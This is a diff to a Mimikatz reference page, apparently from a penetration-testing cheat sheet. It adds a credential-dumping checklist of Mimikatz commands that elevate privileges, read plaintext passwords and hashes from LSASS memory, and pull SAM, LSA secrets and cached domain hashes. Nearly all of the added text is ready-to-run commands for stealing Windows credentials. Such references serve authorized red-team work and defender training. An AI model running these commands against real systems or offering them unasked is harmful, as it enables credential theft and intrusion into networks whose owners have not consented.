@@ -6,6 +6,20 @@ title = "Mimikatz"
 
 Mimikatz is a post-exploitation tool that can extract plaintext passwords, hashes, PINs, and Kerberos tickets from memory. It can also perform pass-the-hash, pass-the-ticket, and build Golden Tickets.
 
+## TL;DR Credential Dumping Checklist
+
+```bash
+privilege::debug
+token::elevate
+sekurlsa::logonpasswords
+sekurlsa::wdigest
+sekurlsa::ekeys
+lsadump::sam
+lsadump::secrets
+lsadump::cache
+lsadump::lsa /patch
+```
+
 ## Important Notes
 
 - **Debug Privilege**: Most Mimikatz operations require `privilege::debug` to access LSASS memory
@@ -46,6 +60,12 @@ log <LOGFILE>.txt
 sekurlsa::logonpasswords
 ```
 
+**Dump WDigest Plaintext Credentials:**
+```bash
+# Plaintext creds if WDigest is enabled (older systems or manually enabled)
+sekurlsa::wdigest
+```
+
 **Dump Specific Hash Types:**
 ```bash
 # Dumps only LM/NTLM hashes
@@ -79,8 +99,18 @@ lsadump::sam
 ### LSA Secrets
 
 ```bash
-# Dumps LSA Secrets (cached domain credentials, service account passwords, etc.)
+# Patches LSASS to dump LSA policy data/hashes
 lsadump::lsa /patch
+```
+
+```bash
+# Dumps LSA secrets from registry (autologon, service account passwords, etc.)
+lsadump::secrets
+```
+
+```bash
+# Dumps cached domain logon hashes (DCC2)
+lsadump::cache
 ```
 
 **Dump Specific Account:**
